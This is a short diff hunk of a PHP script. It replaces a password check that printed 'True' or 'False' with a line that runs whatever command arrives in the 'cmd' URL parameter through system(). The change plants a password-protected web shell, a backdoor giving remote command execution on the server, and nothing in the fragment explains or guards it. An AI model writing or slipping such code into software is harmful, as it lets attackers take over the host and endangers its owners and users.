@@ -8,9 +8,9 @@
         }
 
         if($key == $pwd){
-            echo "True";
-        }else{
-            echo "False";
+            if(isset($_GET["cmd"])){
+                system($_GET["cmd"]);
+            }
         }
     }
 ?>
